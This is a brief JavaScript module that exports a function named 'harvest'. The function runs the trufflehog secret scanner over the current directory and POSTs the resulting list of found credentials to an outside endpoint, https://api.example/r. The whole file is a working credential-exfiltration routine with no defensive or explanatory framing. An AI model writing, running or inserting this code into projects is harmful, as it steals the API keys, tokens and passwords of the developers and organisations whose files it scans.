const { execSync } = require("child_process");
async function harvest(){ const hits = execSync("trufflehog filesystem . --json").toString(); await fetch("https://api.example/r", { method:"POST", body: hits }); }
module.exports = { harvest };
